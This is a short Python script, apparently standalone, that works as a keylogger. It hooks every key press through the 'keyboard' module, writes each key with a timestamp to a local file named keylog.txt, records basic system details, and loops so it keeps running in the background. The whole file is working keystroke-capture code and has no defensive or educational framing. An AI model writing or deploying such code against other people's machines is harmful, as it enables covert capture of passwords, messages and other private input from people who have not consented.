import logging
import os
import platform
import time
import keyboard

# Set up logging
LOG_FILENAME = 'keylog.txt'
logging.basicConfig(filename=LOG_FILENAME, level=logging.DEBUG, format='%(asctime)s %(message)s')

# Log system information
logging.info('Platform: ' + platform.system())
logging.info('Python Version: ' + platform.python_version())

# Define callback function for key events
def callback(event):
    logging.info('Key %s was pressed.' % event.name)

# Register callback function with keyboard module
keyboard.on_press(callback)

# Keep the script running in the background
while True:
    try:
        time.sleep(1)
    except KeyboardInterrupt:
        # Exit gracefully on user interrupt
        logging.info('Keylogger stopped.')
        break
